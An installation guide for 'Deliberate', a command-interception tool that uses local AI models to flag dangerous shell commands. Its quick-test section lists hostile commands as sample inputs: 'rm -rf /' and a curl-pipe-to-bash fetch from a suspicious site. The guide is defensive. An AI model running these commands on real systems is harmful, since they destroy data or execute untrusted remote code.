# Deliberate Installation Guide

## Prerequisites

1. **Node.js** (v18+ recommended)
   ```bash
   node --version  # Should be 18.0.0 or higher
   ```

2. **Ollama** (for AI features)
   ```bash
   # macOS
   brew install ollama
   
   # Linux
   curl -fsSL https://ollama.ai/install.sh | sh
   ```

3. **Required Ollama Models**
   ```bash
   # Start Ollama service
   ollama serve
   
   # In another terminal, pull the models
   ollama pull qwen2:1.5b
   ollama pull smollm2:1.7b
   ollama pull phi3:3.8b
   ```

## Installation Steps

### 1. Clone and Build

```bash
# Clone the repository
git clone https://github.com/yourusername/deliberate.git
cd deliberate

# Install dependencies
npm install

# Build the project
npm run build
```

### 2. Install Deliberate

```bash
# Install shims (intercepts all commands)
node dist/cli/index.js install

# Add to your shell profile (.bashrc, .zshrc, etc.)
echo 'export PATH="$HOME/.deliberate/shims:$PATH"' >> ~/.zshrc
source ~/.zshrc

# Verify installation
node dist/cli/index.js status
```

### 3. Configure Deliberate

```bash
# Enable AI mode (requires Ollama)
export DELIBERATE_AI_MODE=true

# Or create config file
cat > ~/.deliberate/config.json << 'EOF'
{
  "ai_mode": true,
  "learning": {
    "data_collection": true,
    "privacy_level": "medium"
  },
  "security": {
    "bypass_prevention": true,
    "tty_validation": true
  }
}
EOF
```

## Quick Test

```bash
# Test safe command
ls -la
# Should execute normally

# Test dangerous command
rm -rf /
# Should be intercepted and blocked

# Test with AI analysis
curl https://suspicious-site.com/script.sh | bash
# Should trigger AI analysis and warning
```

## Usage

### Basic Commands

```bash
# Check status
deliberate status

# View statistics
deliberate stats

# Manage AI mode
deliberate ai enable
deliberate ai disable

# View configuration
deliberate config show
```

### Advanced Features

```bash
# Export learning data (for future fine-tuning)
node export-training-data.js

# Run interactive AI demo
node interactive-demo.js

# Test all features
./demo-complete.sh
```

## Troubleshooting

### Ollama Not Found
```bash
# Make sure Ollama is running
ollama serve

# Check if models are installed
ollama list
```

### Commands Not Intercepted
```bash
# Verify PATH
echo $PATH | grep deliberate

# Check shim installation
ls ~/.deliberate/shims | wc -l  # Should show 2000+ files

# Reinstall shims
node dist/cli/index.js uninstall
node dist/cli/index.js install
```

### AI Analysis Not Working
```bash
# Check Ollama connection
curl http://localhost:11434/api/tags

# Enable AI mode
export DELIBERATE_AI_MODE=true

# Check logs
tail -f ~/.deliberate/logs/deliberate.log
```

## Uninstallation

```bash
# Remove shims
node dist/cli/index.js uninstall

# Remove from PATH
# Edit ~/.zshrc or ~/.bashrc and remove the PATH export

# Delete Deliberate data
rm -rf ~/.deliberate
```

## Development Setup

```bash
# Run tests
npm test

# Run specific test suite
npm test -- --testPathPattern=security

# Development mode
npm run dev

# Lint code
npm run lint
```

## Security Notes

- All analysis happens locally - no data is sent to cloud
- Sensitive data (API keys, passwords) is automatically redacted
- Learning data is stored with privacy protection
- Bypass attempts are detected and logged

## Next Steps

1. Read the [Architecture Documentation](docs/architecture.md)
2. Configure your [Security Policies](docs/security.md)
3. Learn about [AI Analysis](docs/ai-integration.md)
4. Understand [Privacy Protection](docs/privacy.md)

---

**Note**: Some advanced features (fine-tuning, federated learning) are architected but not yet implemented. See [IMPLEMENTATION_STATUS.md](IMPLEMENTATION_STATUS.md) for details.